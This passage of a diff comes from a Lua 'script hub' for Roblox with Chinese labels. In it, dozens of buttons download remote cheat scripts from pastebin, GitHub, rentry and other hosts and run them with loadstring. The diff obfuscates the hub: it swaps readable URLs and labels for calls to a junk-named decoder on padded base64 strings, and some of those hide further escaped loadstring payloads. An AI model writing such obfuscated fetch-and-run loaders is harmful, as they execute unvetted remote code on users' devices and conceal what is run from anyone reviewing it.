dcMTA1XDExMFwxMDVcNDdcMTA4XDExMVwxMTBcNDdcMTA5XDk3XDEwNVwxMTBcNDdcMTA4XDEwNVwxMTVcMTE5XDEwOVwzNFw0MVw0MVw0MFw0MQ=='))()
 end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JAjIBsWiQRpgwmiyLikNhfUFCiWoBtUHBGGhlbKYPquwikopJFEzHZenwBytZkcLSVQtds5YmR5a6i6ISa5pys'),function()
+    jianke_V4 = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nljVpBddGXDpZAUeYzoWpsBAtbEnyUfBNDVeLgbxQUGIrtIlggTNnYSyFJkXenAdttzXDl5L2c6ICFX+WIneWkjw==')jianke__V4 = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AlBUEdnxzqbFNHKLrQSkUMFLEEDOiJIPEwZVdxCuRawWLjrLKAInHhCldPkzYCGXefLeaq5L2c6ICFUVExNDEyMTUyNjM0')jianke___V4 = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HyVjqmzCKFzIUFysqZBAiYCsCNuJFDxbCGBdvvNQwzjdyfbEMthNUidZHkjXqfUguZmDzi5YmR5a6iUVHnvqQzNDc3MjQxNTU=')loadstring(game:HttpGet((tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rLhKDDpWLbiPcZiAKqvYaaKQPbbfoEgxwuLQhOFaXeudctEnBDkAuWVgmBKrEBKsvhBMJcaHR0cHM6Ly9zaHouYWwvfkppYW5LZVY0'))))()
 end)
-local credits = creds:section("霖溺脚本",true)
-    credits:Button("霖溺脚本，这个脚本不能添加服务器了，后续服务器加在这里",function()
-    loadstring(game:HttpGet("https://shz.al/~LINNI11454666"))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YLcquiFlMZqZCUxyetVVWIXVZrzEqVctTpqbNHTbTBJdjdqDtjaqHVcoyIdApeMsLuljGf6ZyW5rq66ISa5pys'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('juXUlmyPgvhXwIEBOSRlzoiZDhVdcRtjuZarWzAmeNHZtAzjabjMHbAinzvPQnODpdRqXa6ZyW5rq66ISa5pys77yM6L+Z5Liq6ISa5pys5LiN6IO95re75Yqg5pyN5Yqh5Zmo5LqG77yM5ZCO57ut5pyN5Yqh5Zmo5Yqg5Zyo6L+Z6YeM'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wcAqAclYmsnLuyZCecyLbaTWNVFaVlbboTmjtIgTLLpOKQlMidgkVYpYYHDfYSTndLtwGNaHR0cHM6Ly9zaHouYWwvfkxJTk5JMTE0NTQ2NjY=')))()
 end)
-    credits:Button("霖溺脚本电脑端的",function()
-    loadstring(game:HttpGet("https://shz.al/~jxjzj"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ydOyoOUugUSHMtujnNcEgcivIoJiVgEUIEZGdUgkCLXKHVcRvkbtvrtWVFrOnmAezywdof6ZyW5rq66ISa5pys55S16ISR56uv55qE'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hLMChIxmcRppJwnbJBMIsCHHrESRGZjTyvJWwCOJSQSXzbdNRDbXGxhlBCVVNwxXrTWyhVaHR0cHM6Ly9zaHouYWwvfmp4anpq')))()
 end)
-    credits:Button("霖溺另一个手机端脚本（二改的）",function()
-    loadstring(game:HttpGet("https://shz.al/~GHBBJJ"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('imrFwMOANRcMdlghFHFXxwAVdMUtgbHVzgLNDOsmCtptqDMzynLhZxylRNWLaPERcKBubW6ZyW5rq65Y+m5LiA5Liq5omL5py656uv6ISa5pys77yI5LqM5pS555qE77yJ'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NpPfYMNblTEMcyACYoXVGECSEkLckkhFigBCSwyPtsYBQLMJVrSDLtPiIAyLuxonOosXojaHR0cHM6Ly9zaHouYWwvfkdIQkJKSg==')))()
 end)
-    credits:Button("霖溺超多脚本",function()
-    loadstring(game:HttpGet("https://shz.al/~KJANN"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PloQtwhGChvmhtYNvroMEshjGWOGDEFpHeELcopHredjkiyutRxPkCMehhbfoTlPdFTkWz6ZyW5rq66LaF5aSa6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DKaePzrixbyCAQzsBKQRABHtRHQFuJMrJmPWzVpAOVQJuWPeyJWtgLQNSxgjGCMcBDlKQFaHR0cHM6Ly9zaHouYWwvfktKQU5O')))()
 end)
-local credits = creds:section("作者脚本",true)
-    credits:Button("听说最新云脚本",function()
-    _G.CloudScript = "云脚本主群号526684389"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/LOL/main/%E4%BA%91%E8%84%9A%E6%9C%ACCloud%20script.lua", true))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yhgOcwmnaksnmydvSvCgRjattBXMEWJsXUmSsOQyoLbMgbvssrGsntURLbJfpLXlyzvGEn5L2c6ICF6ISa5pys'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UqToNVEcPHcGwhAChpUroOgVhkPYSVnpcJIrklGYYZdOHsHcragDosegOQzMlNGXQXbzPy5ZCs6K+05pyA5paw5LqR6ISa5pys'),function()
+    _G.CloudScript = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cznmRUsjhaGntIUpdtbivSflySsNKXOEsgIsBLxpwCaNOamwoJIdusRPfsOChKoAmVCOyu5LqR6ISa5pys5Li7576k5Y+3NTI2Njg0Mzg5')
+loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nDzKWtummKBPyfgoztZQdnVYHRLIOKwWlWqMMpJEfeaDNClOhFkxvjqXwnjHfLWmrSYhywaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hpYW9ZdW5DTi9MT0wvbWFpbi8lRTQlQkElOTElRTglODQlOUElRTYlOUMlQUNDbG91ZCUyMHNjcmlwdC5sdWE='), true))()
 end)
-    credits:Button("云脚本",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/Xiao-Yun-UWU/main/%E6%B5%B7%E8%B4%BC%E7%8E%8Bbf.lua", true))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FslnQRfvOXfrkdDAgasdJpzCWsYPRaTuffdtnebXaVVogrJQdNZECicDvWwObASGdiklAM5LqR6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RknEBOGoyqFoPbVvZfBwEZEsclzxXPQVooOMbNLqFUDZOvkNwqRBGyUpWwojGuIwaSFrTlaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hpYW9ZdW5DTi9YaWFvLVl1bi1VV1UvbWFpbi8lRTYlQjUlQjclRTglQjQlQkMlRTclOEUlOEJiZi5sdWE='), true))()
 end)
-    credits:Button("山脚本",function()
-    loadstring(game:HttpGet("https://h.lkmc.asia/script/ssfb.lua"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QAiRsItOeRZeFDksNsilfMaOOaqBQToTcsFFaNvdLWTuEkFYrnCkKRJxDNRpXdaEpDdBpy5bGx6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XSPrOrrJTNPlRSBLKCzOPZdVusBmRadOABWEIYpTHMGlLRStlbDsZLdLzsfidDVGFySovkaHR0cHM6Ly9oLmxrbWMuYXNpYS9zY3JpcHQvc3NmYi5sdWE=')))()
 end)
-    credits:Button("青脚本",function()
-    loadstring(game:HttpGet('https://rentry.co/ct293/raw'))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('poRHWacRnDbEiHKthLnqwOejzsahmUAEdTrOHVsMyUyBWgcDOxKMKvcImnPEKPzbdyWYyH6Z2S6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FfkIIuKigWzMwVtHWayhXVKangBlcNlVFMfugovhCqmacOpHFGlmYWjLxlmpwohwLuNLNOaHR0cHM6Ly9yZW50cnkuY28vY3QyOTMvcmF3')))()
 end)
-    credits:Button("陈脚本",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/QxDD9SpW"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jnAGwPsLmJOTrQSUSmWFpOKBMvSGljiTzyfhGMoeObBHMiNbRGxdBpSUwbPJcANGiZDxCQ6ZmI6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kInYUEKPlUbalvnpVamfDuIAHadpGmlqaCmCVZAOWDjSpCNFBxmREXIcizLZSHyQcZLJFaaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1F4REQ5U3BX')))()
 end)
-    credits:Button("杯脚本",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/zuohongjian/bjb/main/llcq"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rXvgQZlmIJWKAtyiPJbydKGodAxNayKtMZPKvjqScipccJWBjINNPjPpFDRZnyRWYZPYei5p2v6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xRiZXzdFjVTECcsjaaDXYwMyrKKzjZmwsEyNVtEaWkhysWlkhFxsNWpSKzYiJqTNngbEjZaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3p1b2hvbmdqaWFuL2JqYi9tYWluL2xsY3E=')))()
 end)
-    credits:Button("北极脚本『中心』",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/KwARpDxV",true))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GHzUYKqcuNSCGMATUFgDOkigFxxigOvSOWKZWKtCHwvmZiHskzhTUcvENBbULBdOVKYTuh5YyX5p6B6ISa5pys44CO5Lit5b+D44CP'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QvjeCUutDywpLxUgepZMNPAdosnLMUKQBUZEkHSTljIwLxCNIpcWhbjqkNWtvgDtUlerSlaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0t3QVJwRHhW'),true))()
 end)
-    credits:Button("地岩脚本",function()
-    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\98\97\109\120\98\98\97\109\120\98\98\97\109\120\47\99\111\100\101\115\112\97\99\101\115\45\98\108\97\110\107\47\109\97\105\110\47\37\69\55\37\57\57\37\66\68\34\41\41\40\41")()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('utBjeKZHsYtLBZBSYvmOWRLoYxnFLXmajBVfZEoNvEBYdFizTqOQZcFSiZRkwFflSWjCAE5Zyw5bKp6ISa5pys'),function()
+    loadstring(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QQfvfZFvDfanBMRWjSFjqisFGKCGdUWaQbiUtytQmzgLiazwfISBGTuqCAUBCycBbaIIVeXDEwOFwxMTFcOTdcMTAwXDExNVwxMTZcMTE0XDEwNVwxMTBcMTAzXDQwXDEwM1w5N1wxMDlcMTAxXDU4XDcyXDExNlwxMTZcMTEyXDcxXDEwMVwxMTZcNDBcMzRcMTA0XDExNlwxMTZcMTEyXDExNVw1OFw0N1w0N1wxMTRcOTdcMTE5XDQ2XDEwM1wxMDVcMTE2XDEwNFwxMTdcOThcMTE3XDExNVwxMDFcMTE0XDk5XDExMVwxMTBcMTE2XDEwMVwxMTBcMTE2XDQ2XDk5XDExMVwxMDlcNDdcOThcOThcOTdcMTA5XDEyMFw5OFw5OFw5N1wxMDlcMTIwXDk4XDk4XDk3XDEwOVwxMjBcNDdcOTlcMTExXDEwMFwxMDFcMTE1XDExMlw5N1w5OVwxMDFcMTE1XDQ1XDk4XDEwOFw5N1wxMTBcMTA3XDQ3XDEwOVw5N1wxMDVcMTEwXDQ3XDM3XDY5XDU1XDM3XDU3XDU3XDM3XDY2XDY4XDM0XDQxXDQxXDQwXDQx'))()
 end)
-    credits:Button("导管中心",function()
-    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RbrIYvVDMoRZYRGQYpbmrQbilEJdTzGNJpUWiYHAsdvPAIONDErwcofeGuMmKsUTTPCYAo5a+8566h5Lit5b+D'),function()
+    loadstring(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uSaiLyVVREFjCYUqlDXXjxIQgSHiXDAoOhEpTYCZQFPDXuhGvbsVDUcLOWNHXOxFvbDKSCXDEwOFwxMTFcOTdcMTAwXDExNVwxMTZcMTE0XDEwNVwxMTBcMTAzXDQwXDEwM1w5N1wxMDlcMTAxXDU4XDcyXDExNlwxMTZcMTEyXDcxXDEwMVwxMTZcNDBcMzRcMTA0XDExNlwxMTZcMTEyXDExNVw1OFw0N1w0N1wxMTRcOTdcMTE5XDQ2XDEwM1wxMDVcMTE2XDEwNFwxMTdcOThcMTE3XDExNVwxMDFcMTE0XDk5XDExMVwxMTBcMTE2XDEwMVwxMTBcMTE2XDQ2XDk5XDExMVwxMDlcNDdcMTE3XDExNVwxMDFcMTE0XDk3XDExMFwxMDFcMTE5XDExNFwxMDJcMTAyXDQ3XDExNFwxMTFcOThcMTA4XDExMVwxMjBcNDVcNDdcMTA5XDk3XDEwNVwxMTBcNDdcMzdcNjlcNTRcMzdcNTdcNjhcMzdcNjVcNDlcMzdcNjlcNTRcMzdcNjVcNjdcMzdcNjZcNjlcMzdcNjlcNTNcMzdcNTZcNjhcMzdcNTZcNzBcMzdcNjlcNTZcMzdcNjVcNjlcMzdcNjVcNjlcMzRcNDFcNDFcNDBcNDFcMTA='))()
 end)
-    credits:Button("脚本中心1.5版本",function()
-    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uKdpeFucEozLiIIijfqhMYokfeCieIpFVyzmjJWiptMEXaEyUwegwjntSGpBqkJchRuLas6ISa5pys5Lit5b+DMS4154mI5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uvcAgHiLVKRlhmNnNfLzsNhZthOOsPCrHvUZelsKVkcxiSagBFVyXwnDOzlNMXKbjkjRloXDEwNFwxMTZcMTE2XDExMlwxMTVcNThcNDdcNDdcMTEyXDk3XDExNVwxMTZcMTAxXDk4XDEwNVwxMTBcNDZcOTlcMTExXDEwOVw0N1wxMTRcOTdcMTE5XDQ3XDEwM1wxMDFcMTA5XDEyMFw3MlwxMTlcNjVcNDk=')))()
 end)
-    credits:Button("玖恶脚本",function()
-    loadstring(game:HttpGet('https://ayangwp.cn/api/v3/file/get/8508/%E7%8E%96%E6%81%B6%E4%B8%AD%E5%BF%83.lua?sign=wt54yWf_f0LDB3gXXyQu0SFQ0oUDUXZBOaWQShwCFGg%3D%3A0'))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rHWrNxsSkkwRApMkOrxPQQrhHRSbqGXqjYsKPsijxhNVgRGthaAQtuGLwHOpWMzXOASsCg546W5oG26ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AQwbfPmpCZncCbkHZiPyQEZblYYNZhDTzNcTbUUexZXKsSMTqlUWIeWThsxKuFSaRKdNhiaHR0cHM6Ly9heWFuZ3dwLmNuL2FwaS92My9maWxlL2dldC84NTA4LyVFNyU4RSU5NiVFNiU4MSVCNiVFNCVCOCVBRCVFNSVCRiU4My5sdWE/c2lnbj13dDU0eVdmX2YwTERCM2dYWHlRdTBTRlEwb1VEVVhaQk9hV1FTaHdDRkdnJTNEJTNBMA==')))()
 end)
-    credits:Button("老大脚本",function()
-    loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/8401/%E8%80%81%E5%A4%A7%E8%84%9A%E6%9C%AC1.0%E7%89%88.txt?sign=XHxQ1ja8djAnEjVEG-eEZFPeZKFHJ0FHeybHpSbtBW4%3D%3A0"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iyyqUZnFdUloByinWhHfDDwyLNgOEziqPsDdiwmoMynSyJdXqPtGqRZYXbmbxboWTqxneg6ICB5aSn6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TjhNNwOeqYclxNuBfpLcvJsGBHvjUalKpkHpTTZRJfFkkYzRgMgezWTDFkxOzGMPepqSyVaHR0cHM6Ly9heWFuZ3dwLmNuL2FwaS92My9maWxlL2dldC84NDAxLyVFOCU4MCU4MSVFNSVBNCVBNyVFOCU4NCU5QSVFNiU5QyVBQzEuMCVFNyU4OSU4OC50eHQ/c2lnbj1YSHhRMWphOGRqQW5FalZFRy1lRVpGUGVaS0ZISjBGSGV5YkhwU2J0Qlc0JTNEJTNBMA==')))()
 end)
-    credits:Button("乌云脚本",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/dT4ZGge8"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MEsvxUctYeZCfCUKiQYCiMXvNOwtPfULZQWNjrsUXfDkhbGXYODypsPqGnJmAXjrahSEqc5LmM5LqR6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BOAsTXzWTsEgFttFfZPuXtkwROYlMarAfMBKYAbemaMpgjSuiuQbYjttSchwSVLlqTJAXSaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2RUNFpHZ2U4')))()
 end)
-    credits:Button("皇脚本",function()
-    loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/8577/%E7%9A%87v5.txt?sign=ToDT3Udyh4r3WwDu_yVblRL849qC2GJjjjQ7FTidF_w%3D%3A0"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mUKCZIEcDEcQsomaTNdtHvlQVVgBkrxPRDBqDDrrSbzDzrtOdGRkqLXjgGHdapTDLMCIGx55qH6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tIgLQvYqaAbjmSAYwQDqnaziUMkleBhHzGTFShAgCnztrHCqVDJKAsJfhwlOkHkdAtTVUOaHR0cHM6Ly9heWFuZ3dwLmNuL2FwaS92My9maWxlL2dldC84NTc3LyVFNyU5QSU4N3Y1LnR4dD9zaWduPVRvRFQzVWR5aDRyM1d3RHVfeVZibFJMODQ5cUMyR0pqampRN0ZUaWRGX3clM0QlM0Ew')))()
 end)
-    credits:Button("冰红茶脚本",function()
-    loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/8582/Protected_9297682332119129.lua?sign=jP-h1AGooC90C0A0O5eDboOCoaQTZpOzLoWzg_oz1eE%3D%3A0"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yEDJarFOmjacmtjdbmThhvcYCfrAtxfScwYOSjIODJaKFfaUInaMwNNULlbWmbISTSYaqz5Yaw57qi6Iy26ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HwcfPOgTAhCbKyoGKiJKWYdBrIbLpKOKiZbmkgDhkjvERCcuywVRwtkufVkMUgVjqLKKrVaHR0cHM6Ly9heWFuZ3dwLmNuL2FwaS92My9maWxlL2dldC84NTgyL1Byb3RlY3RlZF85Mjk3NjgyMzMyMTE5MTI5Lmx1YT9zaWduPWpQLWgxQUdvb0M5MEMwQTBPNWVEYm9PQ29hUVRacE96TG9Xemdfb3oxZUUlM0QlM0Ew')))()
 end)
-    credits:Button("静新脚本",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/jxdjbx/ggff/main/%E5%B8%85%E9%94%85%E4%B8%80%E6%9E%9A%E5%B0%8F%E5%8F%AF%E7%88%B1%E5%91%80%E5%8F%91%E8%B4%A7%E5%A5%BD%E7%9A%84%E5%90%83%E4%B8%8D%E5%90%83%E8%AE%B0%E5%BE%97%E8%AE%B0%E5%BE%97%E4%BD%A0%E6%96%B9%E4%BE%BF%E6%89%93%E5%BC%80%E7%94%B5%E8%84%91%E6%96%B9%E4%B8%8D%E6%96%B9%E4%BE%BF%E8%AE%B0%E5%BE%97%E9%83%BD%E8%A7%81%E4%B8%8D%E5%88%B0%E6%96%B9%E4%BE%BF%E7%9A%84%E8%AF%9D%E6%89%8B%E6%9C%BA%E6%96%B9%E4%B8%8D%E6%96%B9%E4%BE%BF%E5%B0%B1"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oBjGbeKQWYbXbqhdffjjtXnWGhOfMbIUREynvcaEcpqXZEEjKgueNoBDTfRfigYQmqMOdB6Z2Z5paw6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gxUHuuPwcNkEOLPFGNHaKSsDzltytIUrbfeFKBRMcFnxoZKeFIuhrnSfriNHedpfECuhcgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2p4ZGpieC9nZ2ZmL21haW4vJUU1JUI4JTg1JUU5JTk0JTg1JUU0JUI4JTgwJUU2JTlFJTlBJUU1JUIwJThGJUU1JThGJUFGJUU3JTg4JUIxJUU1JTkxJTgwJUU1JThGJTkxJUU4JUI0JUE3JUU1JUE1JUJEJUU3JTlBJTg0JUU1JTkwJTgzJUU0JUI4JThEJUU1JTkwJTgzJUU4JUFFJUIwJUU1JUJFJTk3JUU4JUFFJUIwJUU1JUJFJTk3JUU0JUJEJUEwJUU2JTk2JUI5JUU0JUJFJUJGJUU2JTg5JTkzJUU1JUJDJTgwJUU3JTk0JUI1JUU4JTg0JTkxJUU2JTk2JUI5JUU0JUI4JThEJUU2JTk2JUI5JUU0JUJFJUJGJUU4JUFFJUIwJUU1JUJFJTk3JUU5JTgzJUJEJUU4JUE3JTgxJUU0JUI4JThEJUU1JTg4JUIwJUU2JTk2JUI5JUU0JUJFJUJGJUU3JTlBJTg0JUU4JUFGJTlEJUU2JTg5JThCJUU2JTlDJUJBJUU2JTk2JUI5JUU0JUI4JThEJUU2JTk2JUI5JUU0JUJFJUJGJUU1JUIwJUIx')))()
 end)
-    credits:Button("小魔脚本",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaomoNB666/xiaomoNB666/main/%E6%9E%81.lua"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LfqWQiKIRNcunkwzuCUTEShGkedoVzYbEjXtcjeLGsMDSFrWlqVsmYPpUvixqHFOPWOOyf5bCP6a2U6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yKEVLRoqEpmJspyhGbhxbOOCKGUlNgBCACwnYSzgqjVRHntMWzqfMLSuYuTmWhzyvCIMRRaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hpYW9tb05CNjY2L3hpYW9tb05CNjY2L21haW4vJUU2JTlFJTgxLmx1YQ==')))()
 end)
-    credits:Button("鲨新ui脚本",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/fvvhhh/sturdy-octo-engine/main/Protected_1221338743706560.lua.txt"))()
